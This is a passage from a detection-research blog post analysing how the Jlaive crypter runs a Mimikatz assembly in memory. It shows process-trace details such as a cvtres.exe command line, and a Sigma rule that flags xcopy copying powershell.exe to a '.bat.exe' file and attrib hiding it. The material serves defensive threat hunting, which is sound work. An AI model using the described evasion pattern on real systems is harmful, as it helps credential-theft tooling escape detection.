style="color:#393A34">.</span><span class="token function" style="color:#d73a49">CopyTo</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">mso</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    gs</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Dispose</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    msi</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Dispose</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mso</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Dispose</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> mso</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ToArray</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h3 class="anchor anchorWithStickyNavbar_y2LR" id="cvtressexe---9520">cvtress.exe - 9520<a aria-hidden="true" class="hash-link" href="#cvtressexe---9520" title="Direct link to heading">â€‹</a></h3><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 &quot;/OUT:C:\Users\lab\AppData\Local\Temp\RES7B30.tmp&quot; &quot;c:\Users\lab\AppData\Local\Temp\CSC73E174637C7249A1B3624F5536864A1.TMP&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>The purpose of <code>cvtress.exe</code> is to convert resources to objects at compile time. These objects will eventually be the ones linked into the final .exe.</p><h2 class="anchor anchorWithStickyNavbar_y2LR" id="sigma-rule">Sigma rule<a aria-hidden="true" class="hash-link" href="#sigma-rule" title="Direct link to heading">â€‹</a></h2><p>The behavior of this project is very characteristic, which can help us to create detection rules. For this reason, the following sigma rule can help us to detect these behaviors in our systems.</p><p>Link to sigma rule: <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_jlaive_batch_execution.yml" target="_blank" rel="noopener noreferrer">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_jlaive_batch_execution.yml</a></p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI yml"><pre tabindex="0" class="prism-code language-yml codeBlock_rtdJ thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">title</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> Jlaive Usage For Assembly Execution In</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">Memory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">id</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> 0a99eb3e</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">1617</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">41bd</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">b095</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">13dc767f3def</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">description</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> Detect the use of Jlaive to execute assemblies in a copied PowerShell </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">status</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> experimental</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">date</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> 2022/05/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">modified</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> 2022/05/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">author</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">references</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> https</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">//twitter.com/VakninHai/status/1517027824984547329</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> https</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">//github.com/ch2sh/Jlaive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">logsource</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">product</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> windows</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">category</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> process_creation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">detection</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">parent_selection</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">ParentImage|endswith</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;\cmd.exe&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">ParentCommandLine|endswith</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;.bat&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">selection1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">Image|endswith</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;\xcopy.exe&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">CommandLine|contains|all</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;powershell.exe&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;.bat.exe&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">selection2</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">Image|endswith</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;\attrib.exe&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">CommandLine|contains|all</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;+s&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;+h&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;.bat.exe&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">condition</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> parent_selection and (1 of selection</span><span class="token important">*)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">falsepositives</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> Unknown</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">level</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> medium</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token key atrule" style="color:#00a4db">tags</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> attack.execution</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> attack.t1059.003</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><h2> Contact </h2><p><strong>Twitter</strong>: <a href="https://twitter.com/Joseliyo_Jstnk" target="_blank" rel="noopener noreferrer">https://twitter.com/Joseliyo_Jstnk</a></p><p><strong>LinkedIn</strong>: <a href="https://www.linkedin.com/in/joseluissm/" target="_blank" rel="noopener noreferrer">https://www.linkedin.com/in/joseluissm/</a></p></div><footer class="row docusaurus-mt-lg blogPostDetailsFull_xD8n"><div class="col"><b>Tags:</b><ul class="tags_NBRY padding--none margin-left--sm"><li class="tag_F03v"><a class="tag_WK-t tagRegular_LXbV" href="/jstnk9/research/tags/threat-hunting">threat hunting</a></li><li class="tag_F03v"><a class="tag_WK-t tagRegular_LXbV" href="/jstnk9/research/tags/detection">detection</a></li><li class="tag_F03v"><a class="tag_WK-t tagRegular_LXbV" href="/jstnk9/research/tags/visibility">visibility</a></li><li class="tag_F03v"><a class="tag_WK-t tagRegular_LXbV" href="/jstnk9/research/tags/research">research</a></li><li class="tag_F03v"><a class="tag_WK-t tagRegular_LXbV" href="/jstnk9/research/tags/net">.NET</a></li></ul></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/jstnk9/research/AsyncRAT-Analysis"><div class="pagination-nav__sublabel">Newer Post</div><div class="pagination-nav__label">Â« <!-- -->Analyzing AsyncRAT distributed in Colombia by Blind Eagle</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/jstnk9/research/InstallScreenSaver-SCR-files"><div class="pagination-nav__sublabel">Older Post</div><div class="pagination-nav__label">Executing SCR files using desk.cpl and InstallScreenSaver API Call<!-- --> Â»</div></a></div></nav></main><div class="col col--2"><div class="tableOfContents_vrFS thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#summary" class="table-of-contents__link toc-highlight">Summary</a></li><li><a href="#creating-the-batch-file-with-jlaive" class="table-of-contents__link toc-highlight">Creating the batch file with Jlaive</a></li><li><a href="#executing-the-assembly-mimikatz-batch-file" class="table-of-contents__link toc-highlight">Executing the assembly (Mimikatz batch file)</a><ul><li><a href="#high-level-processes-events" class="table-of-contents__link toc-highlight">High level processes events</a></li><li><a href="#genealogy" class="table-of-contents__link toc-highlight">Genealogy</a></li><li><a href="#cmdexe---2980" class="table-of-contents__link toc-highlight">cmd.exe - 2980</a></li><li><a href="#cmdexe---9420" class="table-of-contents__link toc-highlight">cmd.exe - 9420</a></li><li><a href="#xcopyexe---10188" class="table-of-contents__link toc-highlight">xcopy.exe - 10188</a></li><li><a href="#attribexe---3672" class="table-of-contents__link toc-highlight">attrib.exe - 3672</a></li><li><a href="#katznetassemblybatexe---8576" class="table-of-contents__link toc-highlight">KatzNetAssembly.bat.exe - 8576</a></li><li><a href="#cscexe---5952" class="table-of-contents__link toc-highlight">csc.exe - 5952</a></li><li><a href="#cvtressexe---9520" class="table-of-contents__link toc-highlight">cvtress.exe - 9520</a></li></ul></li><li><a href="#sigma-rule" class="table-of-contents__link toc-highlight">Sigma rule</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Docs</div><ul class="footer__items"><li class="footer__item"><a class="footer__link-item" href="/jstnk9/docs/intro">Home</a></li><li class="footer__item"><a class="footer__link-item" href="/jstnk9/blog">Blog</a></li></ul></div><div class="col footer__col"><div class="footer__title">Social Media</div><ul class="footer__items"><li class="footer__item"><a href="https://twitter.com/Joseliyo_Jstnk" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>Twitter<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://www.linkedin.com/in/joseluissm/" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items"><li class="footer__item"><a href="https://github.com/jstnk9" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright Â© 2023 Jstnk Website.</div></div></div></footer></div>
<script src="/jstnk9/assets/js/runtime~main.f4b21a33.js"></script>
<script src="/jstnk9/assets/js/main.f0c50aa8.js"></script>
</body>
</html>